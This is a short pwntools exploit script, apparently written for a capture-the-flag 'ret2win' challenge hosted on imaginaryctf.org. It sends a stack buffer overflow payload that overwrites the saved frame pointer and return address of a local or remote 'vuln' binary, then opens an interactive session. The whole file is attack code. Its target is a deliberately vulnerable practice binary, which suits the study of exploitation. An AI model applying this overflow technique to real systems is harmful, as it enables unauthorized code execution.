#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("vuln")

local = True 
if local:
    p = process("./vuln")
    gdb.attach(p,'''b*main+12\nc''')
else:
    p = remote('ret2win.chal.imaginaryctf.org', 1337)

elf = context.binary = ELF('./vuln', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

win = elf.sym['win']
main = elf.sym['main']
sh_str = 0x404040
payload = b'a'*0x40 + p64(0x404d40) + p64(main+12)
sl(payload)
sleep(0.2)
p.interactive()